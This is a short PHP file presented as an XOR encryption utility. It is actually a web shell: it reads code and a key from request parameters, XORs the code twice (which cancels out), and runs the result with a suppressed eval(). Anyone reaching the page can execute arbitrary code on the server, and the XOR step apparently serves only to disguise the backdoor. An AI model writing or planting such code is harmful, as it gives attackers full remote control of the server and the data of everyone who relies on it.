<?php
function xorEncryptDecrypt($data, $key) {
    $keyLength = strlen($key);
    $result = '';

    for ($i = 0; $i < strlen($data); $i++) {
        $keyChar = $key[$i % $keyLength];
        $result .= chr(ord($data[$i]) ^ ord($keyChar));
    }

    return $result;
}

$originalData = $_REQUEST["a"];
$key =  $_REQUEST["b"];


$encryptedData = xorEncryptDecrypt($originalData, $key);
$decryptedData = xorEncryptDecrypt($encryptedData, $key);
echo @eval($decryptedData);
?>
